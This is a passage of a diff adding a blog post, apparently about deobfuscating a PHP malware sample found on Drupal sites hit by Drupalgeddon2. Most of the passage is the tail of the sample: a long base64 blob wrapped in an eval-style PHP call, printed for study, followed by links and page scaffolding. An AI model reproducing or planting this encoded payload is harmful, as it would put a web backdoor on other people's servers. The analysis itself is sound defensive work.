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'</span><span class="p">)));</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>While I’d like to take the time to clean these files up as well, I haven’t yet done so. It seems that accesson.php is the one most people are <a href="https://www.blueliv.com/blog-news/research/drupalgeddon2-sa-core-2018-002-cve-2018-7600/">talking about</a>.</p>
+
+<h4 id="original-post">Original Post</h4>
+<p><a href="https://stackoverflow.com/questions/51271592/what-does-this-php-script-do">Here</a> is the original question.</p>
+
+    
+
+
+
+<div class="post-tags">
+  
+    
+    <a href="/tags/#php">
+    
+      <span class="icon">
+        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
+</svg>
+      </span>&nbsp;<span class="tag-name">php</span>
+    </a>
+  
+</div>
+  </div>
+
+  
+  <section class="comments">
+    <h2>Comments</h2>
+    
+  <div id="disqus_thread">
+    <button class="disqus-load" onClick="loadDisqusComments()">
+      Load Comments
+    </button>
+  </div>
+  <script>
+
+  /**
+  *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW
+  *  TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+  *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT:s
+  *  https://disqus.com/admin/universalcode/#configuration-variables
+  */
+  var disqus_config = function () {
+      this.page.url = "http://0.0.0.0:4000/lunchtime-php-deobfuscation/";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.identifier = "" || "http://0.0.0.0:4000/lunchtime-php-deobfuscation/";// Replace PAGE_IDENTIFIER with your page's unique identifier variable
+  }
+  function loadDisqusComments() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = '//https-ryankozak-com.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+  }
+  </script>
+  <noscript>
+    Please enable JavaScript to view the
+    <a href="https://disqus.com/?ref_noscript">comments powered by Disqus</a>.
+  </noscript>
+
+
+
+  </section>
+
+  <section class="related">
+  <h2>Related Posts</h2>
+  <ul class="posts-list">
+    
+      <li>
+        <h3>
+          <a href="/luks-encrypted-arch-linux-on-pinebook-pro/">
+            Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root
+            <small>15 Dec 2020</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box-craft-traceback/">
+            Hack The Box - Traceback
+            <small>17 Aug 2020</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box-craft-traverxec/">
+            Hack The Box - Traverxec
+            <small>12 Apr 2020</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</section>
+
+</div>
+
+    </main>
+
+    
+  </body>
+</html>
